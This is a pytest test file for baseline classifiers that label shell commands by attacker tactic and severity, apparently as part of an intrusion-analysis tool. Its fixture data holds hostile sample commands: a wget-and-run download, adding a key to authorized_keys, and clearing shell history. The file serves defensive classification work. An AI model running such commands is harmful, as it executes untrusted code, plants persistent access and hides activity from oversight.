import pytest

from vulnmaze.classify.baselines import evaluate

LINES = [
    ("uname -a", "Discovery", "R1"),
    ("cat /proc/cpuinfo", "Discovery", "R0"),
    ("wget http://x/a.sh; sh a.sh", "Execution", "R4"),
    ("echo key >> ~/.ssh/authorized_keys", "Persistence", "R3"),
    ("history -c", "Stealth", "R3"),
]
COMMANDS = [
    {"input": line, "tactic": tactic, "severity": severity, "ts": f"{day} 10:00:00+00:00"}
    for day in ("2025-06-27", "2025-06-28")
    for line, tactic, severity in LINES
]


@pytest.mark.parametrize(
    "gold",
    [None, {"uname -a": {"tactic": "Discovery", "severity": "R1"}, "history -c": {"tactic": "Stealth", "severity": ""}}],
)
def test_baselines_train_on_earlier_days_and_score_the_test_day(gold):
    """Both baselines learn the training days, score every test line, and are compared with hand labels when given."""
    results, models = evaluate(COMMANDS, "2025-06-28", gold)
    assert set(models) == {f"{t}_{m}" for t in ("tactic", "severity") for m in ("tfidf_similarity", "random_forest")}
    for task in ("tactic", "severity"):
        assert results[task]["test_lines"] == len(LINES) and results[task]["test_new_shape"] == 0
        assert results[task]["random_forest"]["test"]["accuracy"] == 1.0
        assert ("rules" in results[task]) == bool(gold and any(g[task] for g in gold.values()))


@pytest.mark.parametrize("test_day", ["2025-06-27", "2025-07-01"])
def test_split_without_training_or_test_lines_is_rejected(test_day):
    """A test day with no earlier labelled days, or with no labelled lines of its own, raises."""
    with pytest.raises(ValueError):
        evaluate(COMMANDS, test_day)
